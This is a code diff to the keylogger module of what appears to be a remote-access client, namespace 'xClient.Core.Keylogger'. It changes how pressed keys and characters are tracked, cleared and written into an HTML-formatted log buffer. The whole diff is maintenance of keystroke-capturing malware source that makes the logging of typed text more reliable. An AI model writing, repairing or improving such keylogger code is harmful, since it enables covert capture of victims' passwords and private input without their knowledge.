@@ -130,10 +130,10 @@ namespace xClient.Core.Keylogger
         //This method should be used to process all of our unicode characters
         private void OnKeyPress(object sender, KeyPressEventArgs e) //Called second
         {
-            if (_pressedKeys.IsModifierKeysSet() && _pressedKeys.ContainsKeyChar(e.KeyChar))
+            if (_pressedKeys.IsModifierKeysSet() || _pressedKeys.ContainsKeyChar(e.KeyChar))
                 return;
 
-            if ((!_pressedKeyChars.Contains(e.KeyChar) || !LoggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
+            if ((!_pressedKeyChars.Contains(e.KeyChar) || !LoggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar)))
             {
                 var filtered = LoggerHelper.Filter(e.KeyChar);
                 if (!string.IsNullOrEmpty(filtered))
@@ -149,8 +149,7 @@ namespace xClient.Core.Keylogger
         private void OnKeyUp(object sender, KeyEventArgs e) //Called third
         {
             _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
-            for (int i = 0; i < _pressedKeyChars.Count; i++)
-                _pressedKeyChars.RemoveAt(i);
+            _pressedKeyChars.Clear();
         }
 
         private string HighlightSpecialKeys(Keys[] keys)
@@ -167,7 +166,7 @@ namespace xClient.Core.Keylogger
                 }
                 else
                 {
-                    _pressedKeys.Remove(keys[i]);
+                    names[i] = string.Empty;
                 }
             }
 
@@ -180,7 +179,6 @@ namespace xClient.Core.Keylogger
                 int validSpecialKeys = 0;
                 for (int i = 0; i < names.Length; i++)
                 {
-                    _pressedKeys.Remove(keys[i]);
                     if (string.IsNullOrEmpty(names[i])) continue;
 
                     specialKeys.AppendFormat((validSpecialKeys == 0) ? @"<p class=""h"">[{0}" : " + {0}", names[i]);
@@ -192,6 +190,8 @@ namespace xClient.Core.Keylogger
                     specialKeys.Append("]</p>");
 
                 Debug.WriteLineIf(specialKeys.Length > 0, "HighlightSpecialKeys Output: " + specialKeys.ToString());
+
+                _pressedKeys.Clear();
                 return specialKeys.ToString();
             }
 
@@ -199,7 +199,6 @@ namespace xClient.Core.Keylogger
 
             for (int i = 0; i < names.Length; i++)
             {
-                _pressedKeys.Remove(keys[i]);
                 if (string.IsNullOrEmpty(names[i])) continue;
 
                 switch (names[i])
@@ -215,8 +214,9 @@ namespace xClient.Core.Keylogger
                         break;
                 }
             }
-
             Debug.WriteLineIf(normalKeys.Length > 0, "HighlightSpecialKeys Output: " + normalKeys.ToString());
+
+            _pressedKeys.Clear();
             return normalKeys.ToString();
         }
 
